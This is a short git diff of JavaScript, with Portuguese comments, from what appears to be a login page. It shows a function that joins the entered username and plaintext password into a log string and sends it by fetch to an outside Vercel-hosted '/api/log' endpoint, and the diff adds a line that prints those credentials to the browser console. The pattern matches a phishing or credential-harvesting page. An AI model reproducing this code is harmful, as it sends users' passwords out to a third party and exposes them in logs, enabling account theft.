@@ -137,10 +137,14 @@
         document.getElementById('password').value = '';
       });
   
-      // Função para enviar logs para o Vercel usando a API de logs
+    
+  // Função para enviar logs para o Vercel usando a API de logs
   function enviarLogsParaVercel(username, password, vercelURL) {
     // Monta a mensagem de log
     var logMessage = `Username: ${username}, Password: ${password}`;
+
+    // Exibe os valores no console log antes de enviar a requisição
+    console.log('Enviando log para Vercel:', logMessage);
 
     // Envia a mensagem de log para o Vercel
     fetch(`https://${vercelURL}/api/log`, {
